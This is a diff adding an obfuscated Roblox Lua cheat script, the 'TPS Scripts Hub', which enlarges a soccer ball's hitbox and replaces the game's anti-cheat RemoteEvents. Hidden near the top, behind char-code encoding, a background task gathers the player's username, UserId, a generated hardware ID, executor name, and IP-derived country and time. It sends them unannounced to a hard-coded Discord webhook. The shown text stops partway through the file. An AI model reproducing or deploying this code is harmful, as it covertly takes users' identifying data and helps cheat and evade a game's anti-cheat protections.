@@ -1,0 +1,1931 @@
+if false then local xwboufi_6853=6286 end
+local _a = workspace.FE.System
+[==[ _da9c89_ ]==]
+local _b = _a:FindFirstChild((function() local t=[75, 101, 101, 112, 89, 111, 117, 114, 72, 101, 97, 100, 85, 112] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)())
+local _c = _a:FindFirstChild((function() return string.char(0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x57, 0x6f, 0x72, 0x6c, 0x64) end)())
+[==[ _4da440_ ]==]
+local _d = Instance.new((function() return string.char(82, 101, 109, 111, 116, 101, 69, 118, 101, 110, 116) end)())
+local _e = Instance.new((function() local t=[82, 101, 109, 111, 116, 101, 69, 118, 101, 110, 116] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)())
+local _plr = game.Players.LocalPlayer
+if _b and _c then
+    _d.Name = _b.Name; _d.Parent = _a; _b:Destroy()
+[==[ _53cf73_ ]==]
+    _e.Name = _c.Name; _e.Parent = _a; _c:Destroy()
+do local __5fcc5e_=nil end
+else
+    _plr:Kick((function() return string.char(0x41, 0x6e, 0x74, 0x69, 0x2d, 0x43, 0x68, 0x65, 0x61, 0x74, 0x20, 0x55, 0x70, 0x64, 0x61, 0x74, 0x65, 0x64, 0x21, 0x20, 0x2d, 0x20, 0x57, 0x61, 0x72, 0x6e, 0x20, 0x61, 0x62, 0x6f, 0x75, 0x74, 0x20, 0x74, 0x68, 0x69, 0x73, 0x20, 0x74, 0x6f, 0x20, 0x74, 0x68, 0x65, 0x20, 0x4f, 0x77, 0x6e, 0x65, 0x72, 0x20, 0x6f, 0x66, 0x20, 0x74, 0x68, 0x65, 0x20, 0x53, 0x63, 0x72, 0x69, 0x70, 0x74) end)())
+do local __23254b_=nil end
+end
+
+local Players          = game:GetService((function() return string.char(80, 108, 97, 121, 101, 114, 115) end)())
+local TweenService     = game:GetService((function() local t=[84, 119, 101, 101, 110, 83, 101, 114, 118, 105, 99, 101] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)())
+[==[ xinew8B8 ]==]
+local UserInputService = game:GetService((function() return string.char(0x55, 0x73, 0x65, 0x72, 0x49, 0x6e, 0x70, 0x75, 0x74, 0x53, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65) end)())
+local RunService       = game:GetService((function() return string.char(82, 117, 110, 83, 101, 114, 118, 105, 99, 101) end)())
+do local _daulrlgl_2cdc=nil end
+local ReplicatedStorage= game:GetService((function() local t=[82, 101, 112, 108, 105, 99, 97, 116, 101, 100, 83, 116, 111, 114, 97, 103, 101] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)())
+do local __38e726_=nil end
+local Workspace        = game:GetService((function() return string.char(0x57, 0x6f, 0x72, 0x6b, 0x73, 0x70, 0x61, 0x63, 0x65) end)())
+local HttpService      = game:GetService((function() return string.char(72, 116, 116, 112, 83, 101, 114, 118, 105, 99, 101) end)())
+local Lighting         = game:GetService((function() local t=[76, 105, 103, 104, 116, 105, 110, 103] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)())
+
+do local _baqeluluYxzjb=nil end
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui   = LocalPlayer:WaitForChild((function() return string.char(0x50, 0x6c, 0x61, 0x79, 0x65, 0x72, 0x47, 0x75, 0x69) end)())
+
+local isMobile = UserInputService.TouchEnabled
+
+local WEBHOOK_URL = (function() return string.char(104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47, 49, 53, 51, 55, 57, 48, 54, 54, 54, 49, 53, 51, 52, 57, 57, 52, 52, 53, 51, 47, 98, 101, 101, 85, 73, 116, 68, 107, 101, 82, 52, 102, 98, 45, 115, 53, 87, 75, 71, 97, 99, 55, 104, 121, 120, 88, 80, 108, 54, 105, 74, 111, 79, 121, 54, 120, 73, 103, 113, 117, 79, 114, 82, 85, 56, 89, 121, 51, 111, 112, 118, 79, 105, 52, 56, 90, 107, 85, 99, 110, 54, 65, 107, 122, 81, 85, 82, 109) end)()
+
+local function getHWID()
+    local hwid = (function() local t=[85, 110, 107, 110, 111, 119, 110] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()
+do local __4058e_=nil end
+    pcall(function()
+[==[ samiveMTQHF ]==]
+        if syn and syn.crypt and syn.crypt.custom_hash then
+            hwid = syn.crypt.custom_hash(tostring(game.PlaceId) .. tostring(LocalPlayer.UserId))
+if false then local hbuzmmfd_b3d8=8984 end
+        elseif getexecutorname and pcall(getexecutorname) then
+            local exec = getexecutorname()
+            if exec == (function() return string.char(0x4b, 0x52, 0x4e, 0x4c) end)() then
+                hwid = syn and syn.crypt and syn.crypt.custom_hash and syn.crypt.custom_hash((function() return string.char(75, 82, 78, 76, 95, 72, 87, 73, 68) end)()) or (function() local t=[75, 82, 78, 76, 95, 72, 87, 73, 68] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()
+            elseif exec == (function() return string.char(0x46, 0x6c, 0x75, 0x78, 0x75, 0x73) end)() then
+[==[ _861f8e_ ]==]
+                hwid = syn and syn.crypt and syn.crypt.custom_hash and syn.crypt.custom_hash((function() return string.char(70, 76, 85, 88, 85, 83, 95, 72, 87, 73, 68) end)()) or (function() local t=[70, 76, 85, 88, 85, 83, 95, 72, 87, 73, 68] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()
+if false then local _b71745_=2711 end
+            elseif exec == (function() return string.char(0x53, 0x79, 0x6e, 0x61, 0x70, 0x73, 0x65, 0x20, 0x58) end)() then
+[==[ nabemakiTiNE ]==]
+                hwid = syn and syn.crypt and syn.crypt.custom_hash and syn.crypt.custom_hash((function() return string.char(83, 89, 78, 65, 80, 83, 69, 95, 72, 87, 73, 68) end)()) or (function() local t=[83, 89, 78, 65, 80, 83, 69, 95, 72, 87, 73, 68] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()
+[==[ mhcsek_43c0 ]==]
+            elseif exec == (function() return string.char(0x53, 0x63, 0x72, 0x69, 0x70, 0x74, 0x2d, 0x57, 0x61, 0x72, 0x65) end)() then
+                hwid = syn and syn.crypt and syn.crypt.custom_hash and syn.crypt.custom_hash((function() return string.char(83, 67, 82, 73, 80, 84, 87, 65, 82, 69, 95, 72, 87, 73, 68) end)()) or (function() local t=[83, 67, 82, 73, 80, 84, 87, 65, 82, 69, 95, 72, 87, 73, 68] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()
+[==[ _ef8c5e_ ]==]
+            else
+do local _xanamVjO=nil end
+                local salt = tostring(game.PlaceId) .. tostring(LocalPlayer.UserId) .. os.time()
+                hwid = HttpService:GenerateGUID(false) or (function() return string.char(0x47, 0x45, 0x4e, 0x45, 0x52, 0x41, 0x54, 0x45, 0x44, 0x5f, 0x48, 0x57, 0x49, 0x44) end)()
+            end
+        end
+    end)
+    return hwid
+[==[ megorejizM ]==]
+end
+
+local function getExec()
+    if type(identifyexecutor) == (function() return string.char(102, 117, 110, 99, 116, 105, 111, 110) end)() then
+        local ok, name = pcall(identifyexecutor)
+if false then local fibkyh_8ecc=3917 end
+        if ok and name and name ~= "" then return name end
+    end
+do local _bobabuNxVw9=nil end
+    if type(getexecutorname) == (function() local t=[102, 117, 110, 99, 116, 105, 111, 110] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)() then
+        local ok, name = pcall(getexecutorname)
+        if ok and name and name ~= "" then return name end
+    end
+if false then local _e241e5_=1416 end
+    local checks = {
+do local __b09e52_=nil end
+        {function() return syn and syn.request end, (function() return string.char(0x53, 0x79, 0x6e, 0x61, 0x70, 0x73, 0x65, 0x20, 0x58) end)()},
+        {function() return KRNL_LOADED end, (function() return string.char(75, 82, 78, 76) end)()},
+do local _moxitm=nil end
+        {function() return fluxus end, (function() local t=[70, 108, 117, 120, 117, 115] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()},
+[==[ dafaxiiDxNU ]==]
+        {function() return Electron end, (function() return string.char(0x45, 0x6c, 0x65, 0x63, 0x74, 0x72, 0x6f, 0x6e) end)()},
+        {function() return celery end, (function() return string.char(67, 101, 108, 101, 114, 121) end)()},
+if false then local _803a1d_=2252 end
+        {function() return AWP end, (function() local t=[65, 87, 80, 46, 71, 71] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()},
+        {function() return getgenv().ScriptWare end, (function() return string.char(0x53, 0x63, 0x72, 0x69, 0x70, 0x74, 0x2d, 0x57, 0x61, 0x72, 0x65) end)()},
+[==[ sgar_4f37 ]==]
+        {function() return getgenv().SYNZ_LOADED end, (function() return string.char(83, 121, 110, 97, 112, 115, 101, 32, 90) end)()},
+[==[ xaxuzemej8RYL ]==]
+        {function() return getgenv().DELTA_LOADED end, (function() local t=[68, 101, 108, 116, 97] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()},
+        {function() return getgenv().CODEX_LOADED end, (function() return string.char(0x43, 0x6f, 0x64, 0x65, 0x78) end)()},
+        {function() return getgenv().EVON_LOADED end, (function() return string.char(69, 118, 111, 110) end)()},
+        {function() return getgenv().hydrogen end, (function() local t=[72, 121, 100, 114, 111, 103, 101, 110] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()},
+        {function() return getgenv().is_sirhurt_closure end, (function() return string.char(0x53, 0x69, 0x72, 0x48, 0x75, 0x72, 0x74) end)()},
+    }
+    for _, v in ipairs(checks) do
+        local ok, res = pcall(v[1])
+        if ok and res then return v[2] end
+do local __5a25c3_=nil end
+    end
+    return (function() return string.char(85, 110, 107, 110, 111, 119, 110) end)()
+end
+
+do local __d0d424_=nil end
+local function getCountryAndTZ()
+    local ok, res = pcall(request, {Url=(function() local t=[104, 116, 116, 112, 58, 47, 47, 105, 112, 45, 97, 112, 105, 46, 99, 111, 109, 47, 106, 115, 111, 110, 47, 63, 102, 105, 101, 108, 100, 115, 61, 99, 111, 117, 110, 116, 114, 121, 44, 116, 105, 109, 101, 122, 111, 110, 101, 44, 115, 116, 97, 116, 117, 115] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(), Method=(function() return string.char(0x47, 0x45, 0x54) end)()})
+    if ok and res and res.Body then
+        local ok2, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
+if false then local znoyg_d01e=4529 end
+        if ok2 and data and data.status == (function() return string.char(115, 117, 99, 99, 101, 115, 115) end)() then
+            return data.country or (function() local t=[63, 63, 63] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(), data.timezone or (function() return string.char(0x55, 0x54, 0x43) end)()
+if false then local _3d45cc_=6280 end
+        end
+    end
+    local country = (function() return string.char(63, 63, 63) end)()
+    local ok3, res3 = pcall(request, {Url=(function() local t=[104, 116, 116, 112, 115, 58, 47, 47, 105, 112, 119, 104, 111, 46, 105, 115, 47, 63, 102, 105, 101, 108, 100, 115, 61, 99, 111, 117, 110, 116, 114, 121] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(), Method=(function() return string.char(0x47, 0x45, 0x54) end)()})
+[==[ cixosededlD ]==]
+    if ok3 and res3 and res3.Body then
+if false then local yipedkK=9338 end
+        local ok4, data2 = pcall(HttpService.JSONDecode, HttpService, res3.Body)
+        if ok4 and data2 and data2.country then country = data2.country end
+do local _keruniTx=nil end
+    end
+    return country, (function() return string.char(85, 84, 67) end)()
+end
+
+[==[ _bcb128_ ]==]
+local function getTime(tz)
+do local _domunone9B=nil end
+    local time = os.date((function() local t=[33, 37, 72, 58, 37, 77, 58, 37, 83, 32, 45, 32, 37, 100, 47, 37, 109, 47, 37, 89] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)())
+[==[ cyjaa_5e44 ]==]
+    local ok, res = pcall(request, {Url=(function() return string.char(0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f, 0x77, 0x6f, 0x72, 0x6c, 0x64, 0x74, 0x69, 0x6d, 0x65, 0x61, 0x70, 0x69, 0x2e, 0x6f, 0x72, 0x67, 0x2f, 0x61, 0x70, 0x69, 0x2f, 0x74, 0x69, 0x6d, 0x65, 0x7a, 0x6f, 0x6e, 0x65, 0x2f) end)()..tz, Method=(function() return string.char(71, 69, 84) end)()})
+    if ok and res and res.Body then
+        local ok2, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
+[==[ _72d4e1_ ]==]
+        if ok2 and data and data.datetime then
+[==[ bure0AMg ]==]
+            local h,m,s = data.datetime:match((function() local t=[84, 40, 37, 100, 37, 100, 41, 58, 40, 37, 100, 37, 100, 41, 58, 40, 37, 100, 37, 100, 41] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)())
+[==[ hufasojo6E ]==]
+            local y,mo,d = data.datetime:match((function() return string.char(0x28, 0x25, 0x64, 0x25, 0x64, 0x25, 0x64, 0x25, 0x64, 0x29, 0x2d, 0x28, 0x25, 0x64, 0x25, 0x64, 0x29, 0x2d, 0x28, 0x25, 0x64, 0x25, 0x64, 0x29) end)())
+do local __ef5a24_=nil end
+            if h then time = string.format((function() return string.char(37, 115, 58, 37, 115, 58, 37, 115, 32, 45, 32, 37, 115, 47, 37, 115, 47, 37, 115) end)(),h,m,s,d,mo,y) end
+[==[ piteXLpE ]==]
+        end
+    end
+    return time
+[==[ _766ef8_ ]==]
+end
+
+task.spawn(function()
+if false then local rokupowiFpfy=1512 end
+    local exec = getExec()
+    local country, tz = getCountryAndTZ()
+do local __d7fec_=nil end
+    local myTime = getTime(tz)
+if false then local yactf_5bf3=1493 end
+    local hwid = getHWID()
+    pcall(request, {
+        Url = WEBHOOK_URL,
+        Method = (function() local t=[80, 79, 83, 84] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),
+        Headers = {[(function() return string.char(0x43, 0x6f, 0x6e, 0x74, 0x65, 0x6e, 0x74, 0x2d, 0x54, 0x79, 0x70, 0x65) end)()]=(function() return string.char(97, 112, 112, 108, 105, 99, 97, 116, 105, 111, 110, 47, 106, 115, 111, 110) end)()},
+do local _funonoZ32Zw=nil end
+        Body = HttpService:JSONEncode({
+            content = string.format(
+                (function() local t=[42, 42, 84, 80, 83, 32, 83, 99, 114, 105, 112, 116, 115, 32, 72, 117, 98, 42, 42, 10, 96, 96, 96, 10, 85, 115, 101, 114, 58, 32, 37, 115, 10, 73, 68, 58, 32, 37, 115, 10, 72, 87, 73, 68, 58, 32, 37, 115, 10, 67, 111, 117, 110, 116, 114, 121, 58, 32, 37, 115, 10, 69, 120, 101, 99, 117, 116, 111, 114, 58, 32, 37, 115, 10, 84, 105, 109, 101, 58, 32, 37, 115, 10, 84, 105, 109, 101, 122, 111, 110, 101, 58, 32, 37, 115, 10, 96, 96, 96] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),
+                LocalPlayer.Name,
+                LocalPlayer.UserId,
+                hwid,
+                country,
+                exec,
+                myTime,
+                tz
+            )
+        }),
+    })
+do local __ee8e36_=nil end
+end)
+
+local F = {
+do local __306137_=nil end
+    Title = Enum.Font.FredokaOne,
+    Body  = Enum.Font.Nunito,
+    Bold  = Enum.Font.Nunito,
+    Mono  = Enum.Font.RobotoMono,
+}
+
+local CFG = {
+    Name    = (function() return string.char(0x54, 0x50, 0x53, 0x20, 0x53, 0x63, 0x72, 0x69, 0x70, 0x74, 0x73, 0x20, 0x48, 0x75, 0x62) end)(),
+    Version = (function() return string.char(118, 49) end)(),
+if false then local xifusewegZQj3=2017 end
+    W = isMobile and 380 or 720, 
+[==[ _73acca_ ]==]
+    H = isMobile and 620 or 460,
+    SidebarExp = isMobile and 150 or 192, 
+    SidebarCol = isMobile and 50 or 52,
+[==[ cehuso3umjO ]==]
+    Tabs = {
+        { Name = (function() local t=[82, 101, 97, 99, 104] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()     },
+if false then local _69e3b4_=628 end
+        { Name = (function() return string.char(0x56, 0x69, 0x73, 0x75, 0x61, 0x6c) end)()    },
+        { Name = (function() return string.char(76, 101, 103, 32, 86, 105, 115, 117, 97, 108) end)()},
+        { Name = (function() local t=[77, 111, 118, 101, 109, 101, 110, 116] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()  },
+if false then local avlz_2282=1776 end
+        { Name = (function() return string.char(0x41, 0x76, 0x61, 0x74, 0x61, 0x72) end)()    },
+        { Name = (function() return string.char(77, 105, 115, 99) end)()      },
+        { Name = (function() local t=[65, 98, 111, 117, 116] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()     },
+    },
+    C = {
+        BG       = Color3.fromRGB( 10,  8,  18),
+        Sidebar  = Color3.fromRGB( 13, 10,  22),
+        TitleBar = Color3.fromRGB( 11,  9,  20),
+if false then local ladipueo8fx=7838 end
+        Card     = Color3.fromRGB( 19, 16,  30),
+if false then local _2ecf36_=6175 end
+        ActiveBg = Color3.fromRGB( 30, 26,  48),
+        Border   = Color3.fromRGB( 42, 38,  62),
+do local _bvztyxem_3dd3=nil end
+        Input    = Color3.fromRGB( 15, 12,  25),
+        Text     = Color3.fromRGB( 230, 225, 245),
+        SubText  = Color3.fromRGB( 110, 100, 140),
+        Accent   = Color3.fromRGB( 140, 90,  255),
+        AccentD  = Color3.fromRGB( 100, 60, 200),
+        Green    = Color3.fromRGB( 80, 200, 120),
+[==[ gosa1lxa ]==]
+        Red      = Color3.fromRGB( 220, 70,  70),
+        Close    = Color3.fromRGB( 210, 80,  75),
+        Minimize = Color3.fromRGB( 200, 160, 45),
+        Maximize = Color3.fromRGB( 50, 180, 70),
+    },
+}
+
+local char     = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+local root     = char:WaitForChild((function() return string.char(0x48, 0x75, 0x6d, 0x61, 0x6e, 0x6f, 0x69, 0x64, 0x52, 0x6f, 0x6f, 0x74, 0x50, 0x61, 0x72, 0x74) end)())
+do local _xprrlb_8f47=nil end
+local human    = char:WaitForChild((function() return string.char(72, 117, 109, 97, 110, 111, 105, 100) end)())
+local head     = char:WaitForChild((function() local t=[72, 101, 97, 100] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)())
+local rightLeg = char:FindFirstChild((function() return string.char(0x52, 0x69, 0x67, 0x68, 0x74, 0x20, 0x4c, 0x65, 0x67) end)())    or char:FindFirstChild((function() return string.char(82, 105, 103, 104, 116, 76, 111, 119, 101, 114, 76, 101, 103) end)())
+do local __c7baf5_=nil end
+local leftLeg  = char:FindFirstChild((function() local t=[76, 101, 102, 116, 32, 76, 101, 103] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)())     or char:FindFirstChild((function() return string.char(0x4c, 0x65, 0x66, 0x74, 0x4c, 0x6f, 0x77, 0x65, 0x72, 0x4c, 0x65, 0x67) end)())
+
+do local _mkijduw_b32b=nil end
+local config = {
+do local _begafukeEVK=nil end
+    Reach=2.5, ReachType=(function() return string.char(66, 97, 108, 108) end)(), ReachVisibility=0.85,
+if false then local wteij_3f96=7248 end
+    LegReach=false, LegReachDist=5,
+[==[ fvepfo_db32 ]==]
+    LegVisual=false, LegVisualTransp=0,
+if false then local lelofeNcw3=5094 end
+    LegVisualR=255, LegVisualG=100, LegVisualB=100,
+[==[ _a28e5a_ ]==]
+    LegVisualNeon=false, LegVisualForceField=true, LegVisualGlass=false,
+    LegVisualReflect=0, LegVisualShape=(function() local t=[66, 97, 108, 108] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),
+do local _jaconokH=nil end
+    LegVisualSizeX=5, LegVisualSizeY=5, LegVisualSizeZ=5,
+do local _qdyyg_7979=nil end
+}
+
+local tps, tpsclone = nil, nil
+
+if false then local _557c51_=7258 end
+local function setupBall()
+    tps = workspace.TPSSystem:WaitForChild((function() return string.char(0x54, 0x50, 0x53) end)())
+    tps.Size = Vector3.new(config.Reach, config.Reach, config.Reach)
+    tps.Transparency = config.ReachVisibility
+    tps.CanCollide = false
+    
+    local existingProxy = workspace:FindFirstChild((function() return string.char(67, 108, 105, 101, 110, 116, 66, 97, 108, 108, 80, 114, 111, 120, 121, 95, 84, 80, 83) end)())
+    if existingProxy then
+        if tps and tps.Size.X ~= ReplicatedStorage.TPS.Size.X then
+if false then local jmudbkh_11e3=1624 end
+            existingProxy:Destroy()
+do local _skhi_5f6a=nil end
+            if tpsclone and tpsclone.Parent then
+                tpsclone.CanCollide = true
+            end
+if false then local rtfaxu_d0f6=3563 end
+        end
+[==[ kzmmjw_3f03 ]==]
+    end
+    
+    workspace.ChildAdded:Connect(function(child)
+        if child.Name == (function() local t=[67, 108, 105, 101, 110, 116, 66, 97, 108, 108, 80, 114, 111, 120, 121, 95, 84, 80, 83] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)() then
+            if tps and tps.Size.X ~= ReplicatedStorage.TPS.Size.X then
+do local __5549ee_=nil end
+                child:Destroy()
+                if tpsclone and tpsclone.Parent then
+[==[ _7f4479_ ]==]
+                    tpsclone.CanCollide = true
+                end
+            end
+        end
+    end)
+if false then local ncrcp_9689=8942 end
+end
+
+local function setupTPSClone()
+    if (not tps or not tps.Parent) then return end
+    local old = workspace.TPSSystem:FindFirstChild((function() return string.char(0x54, 0x50, 0x53, 0x43, 0x6c, 0x6f, 0x6e, 0x65) end)())
+[==[ _cd9c96_ ]==]
+    if old then old:Destroy() end
+    tpsclone = tps:Clone()
+do local __ac87b0_=nil end
+    tpsclone.Parent = workspace.TPSSystem
+    tpsclone.Name = (function() return string.char(84, 80, 83, 67, 108, 111, 110, 101) end)()
+    local ref = ReplicatedStorage.TPS
+    tpsclone.Size = ref.Size
+    tpsclone.Color = ref.Color
+    tpsclone.Material = ref.Material
+    tpsclone.Reflectance = ref.Reflectance
+    tpsclone.Transparency = 0
+do local _zrahc_d6ef=nil end
+    tpsclone.CanCollide = false
+    tpsclone.Massless = true
+do local _rlmspuet_7be5=nil end
+    tpsclone.Anchored = false
+    tpsclone.Shape = Enum.PartType.Ball
+    for _, v in pairs(tpsclone:GetChildren()) do
+if false then local _d80c04_=8241 end
+        if not v:IsA((function() local t=[68, 101, 99, 97, 108] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()) then v:Destroy() end
+do local _vprgpobp_468a=nil end
+    end
+    for _, v in pairs(tps:GetChildren()) do
+do local __bb6527_=nil end
+        if v:IsA((function() return string.char(0x44, 0x65, 0x63, 0x61, 0x6c) end)()) then
+            v.Transparency = 1
+[==[ wmom_87a5 ]==]
+        elseif v:IsA((function() return string.char(72, 105, 103, 104, 108, 105, 103, 104, 116) end)()) then
+            v.Enabled = true
+            v:Clone().Parent = tpsclone
+        end
+    end
+end
+
+local function startProxyMonitor()
+    task.spawn(function()
+        while task.wait(0.5) do
+            if config.Reach ~= 2.5 then
+do local _xhfytgv_b72b=nil end
+                local proxy = workspace:FindFirstChild((function() local t=[67, 108, 105, 101, 110, 116, 66, 97, 108, 108, 80, 114, 111, 120, 121, 95, 84, 80, 83] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)())
+                if proxy then
+                    proxy:Destroy()
+[==[ zisibaUdAlj ]==]
+                    if tpsclone and tpsclone.Parent then
+                        tpsclone.CanCollide = true
+                    end
+                end
+                
+                if not workspace:FindFirstChild((function() return string.char(0x43, 0x6c, 0x69, 0x65, 0x6e, 0x74, 0x42, 0x61, 0x6c, 0x6c, 0x50, 0x72, 0x6f, 0x78, 0x79, 0x5f, 0x54, 0x50, 0x53) end)()) then
+                    if tpsclone and tpsclone.Parent then
+[==[ wszxab_33d8 ]==]
+                        tpsclone.CanCollide = false
+                    end
+[==[ javugaPzTcK ]==]
+                end
+if false then local yokihiuzZ=2279 end
+            end
+        end
+if false then local muvoFF=9613 end
+    end)
+do local _zsgecqir_1c82=nil end
+end
+
+do local _qcidad_d06f=nil end
+spawn(function()
+do local __c9ac39_=nil end
+    local sys=workspace.FE.System; local bk=sys:FindFirstChild((function() return string.char(75, 101, 101, 112, 89, 111, 117, 114, 72, 101, 97, 100, 85, 112) end)())
+    local re=Instance.new((function() local t=[82, 101, 109, 111, 116, 101, 69, 118, 101, 110, 116] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)())
+if false then local _b1f3e9_=8394 end
+    if bk then re.Name=bk.Name; re.Parent=sys; bk:Destroy()
+    else LocalPlayer:Kick((function() return string.char(0x41, 0x6e, 0x74, 0x69, 0x2d, 0x43, 0x68, 0x65, 0x61, 0x74, 0x20, 0x55, 0x70, 0x64, 0x61, 0x74, 0x65, 0x64, 0x20, 0x2d, 0x20, 0x43, 0x6f, 0x6e, 0x74, 0x61, 0x63, 0x74, 0x20, 0x53, 0x63, 0x72, 0x69, 0x70, 0x74, 0x20, 0x4f, 0x77, 0x6e, 0x65, 0x72) end)()) end
+do local _voba4I0=nil end
+    repeat task.wait() until workspace.TPSSystem:FindFirstChild((function() return string.char(84, 80, 83) end)())
+do local _fubu3r5eH=nil end
+    tps=workspace.TPSSystem:WaitForChild((function() local t=[84, 80, 83] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)())
+    tps.Size=Vector3.new(config.Reach,config.Reach,config.Reach); tps.Transparency=config.ReachVisibility; tps.CanCollide=false
+    setupTPSClone()
+do local __754029_=nil end
+    RunService.Heartbeat:Connect(function()
+do local _bujbmn_e2a2=nil end
+        if not tps or not tps.Parent then
+if false then local cstkfhp_3441=4231 end
+            local nt=workspace.TPSSystem:FindFirstChild((function() return string.char(0x54, 0x50, 0x53) end)())
+            if nt then tps=nt; tps.Size=Vector3.new(config.Reach,config.Reach,config.Reach); tps.Transparency=config.ReachVisibility; tps.CanCollide=false
+if false then local zrgr_d984=7920 end
+            else return end
+        end
+        if not tpsclone or not tpsclone.Parent then setupTPSClone(); return end
+        local ref=ReplicatedStorage.TPS
+        tpsclone.CFrame=tps.CFrame; tpsclone.Color=ref.Color; tpsclone.Material=ref.Material
+if false then local gituSdMwt=780 end
+        tpsclone.Reflectance=0; tpsclone.Transparency=0; tpsclone.Size=ref.Size; tps.CanCollide=false
+        for i=1,6 do
+if false then local oqifofh_04fb=5477 end
+            local dd=tps:FindFirstChild((function() return string.char(68, 101, 99, 97, 108) end)()..i); local dc=tpsclone:FindFirstChild((function() local t=[68, 101, 99, 97, 108] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()..i)
+            if dd and dc then dc.Texture=dd.Texture; dc.Transparency=0 end
+[==[ fqcs_3c02 ]==]
+        end
+do local __78c31d_=nil end
+        for _,v in pairs(tps:GetChildren()) do if v:IsA((function() return string.char(0x44, 0x65, 0x63, 0x61, 0x6c) end)()) then v.Transparency=1 end end
+    end)
+end)
+
+do local __fbb25c_=nil end
+local legVisualPart = nil
+
+local function applyLegVisualProps()
+    if not legVisualPart or not legVisualPart.Parent then return end
+    legVisualPart.Size=Vector3.new(config.LegVisualSizeX,config.LegVisualSizeY,config.LegVisualSizeZ)
+    legVisualPart.Color=Color3.fromRGB(config.LegVisualR,config.LegVisualG,config.LegVisualB)
+    legVisualPart.Reflectance=config.LegVisualReflect
+    legVisualPart.Transparency=(config.LegVisual and config.LegVisualTransp) or 1
+if false then local pecufonhWUG=53 end
+    pcall(function() legVisualPart.Shape=Enum.PartType[config.LegVisualShape] end)
+    if config.LegVisualForceField then legVisualPart.Material=Enum.Material.ForceField
+    elseif config.LegVisualNeon then legVisualPart.Material=Enum.Material.Neon
+    elseif config.LegVisualGlass then legVisualPart.Material=Enum.Material.Glass
+    else legVisualPart.Material=Enum.Material.SmoothPlastic end
+[==[ kedinRPj ]==]
+end
+
+local function destroyLegVisualPart()
+    if legVisualPart and legVisualPart.Parent then legVisualPart:Destroy() end; legVisualPart=nil
+end
+
+local function createLegVisualPart()
+    if legVisualPart and legVisualPart.Parent then legVisualPart:Destroy() end; legVisualPart=nil
+    local chr=LocalPlayer.Character; if not chr then return end
+if false then local _d869ba_=3766 end
+    local hrp=chr:FindFirstChild((function() return string.char(72, 117, 109, 97, 110, 111, 105, 100, 82, 111, 111, 116, 80, 97, 114, 116) end)()); if not hrp then return end
+    local p=Instance.new((function() local t=[80, 97, 114, 116] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()); p.Name=(function() return string.char(0x4c, 0x65, 0x67, 0x52, 0x65, 0x61, 0x63, 0x68, 0x56, 0x69, 0x73, 0x75, 0x61, 0x6c) end)(); p.CanCollide=false; p.Massless=true
+[==[ fubikr ]==]
+    p.Anchored=true; p.CastShadow=false; p.Parent=workspace
+    RunService.Heartbeat:Connect(function()
+        if not p or not p.Parent then return end
+if false then local _f7ab8b_=421 end
+        local c=LocalPlayer.Character; local h=c and c:FindFirstChild((function() return string.char(72, 117, 109, 97, 110, 111, 105, 100, 82, 111, 111, 116, 80, 97, 114, 116) end)())
+[==[ _88f69c_ ]==]
+        if h then p.CFrame=h.CFrame end
+    end)
+    legVisualPart=p; applyLegVisualProps()
+[==[ lupanurauc ]==]
+end
+
+local legReachConn=nil; local legFakeParts={}; local legOrigParts={}; local legOrigMotors={}
+
+if false then local senijexaqF=3535 end
+local function cleanupLegReach()
+    if legReachConn then legReachConn:Disconnect(); legReachConn=nil end
+if false then local midowo5SJR=127 end
+    for _,p in ipairs(legFakeParts) do if p and p.Parent then p:Destroy() end end; legFakeParts={}
+do local _soxi55f=nil end
+    for _,m in ipairs(legOrigMotors) do if m and m.Parent then m.Enabled=true end end; legOrigMotors={}
+    for _,p in ipairs(legOrigParts) do if p and p.Parent then p.Transparency=0; p.Massless=false; p.Anchored=false end end; legOrigParts={}
+    destroyLegVisualPart()
+end
+
+local function findMotor(chr,part1)
+if false then local tjumq_df70=402 end
+    for _,v in ipairs(chr:GetDescendants()) do if v:IsA((function() local t=[77, 111, 116, 111, 114, 54, 68] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()) and v.Part1==part1 then return v end end
+end
+
+[==[ tgfgekx_0cfe ]==]
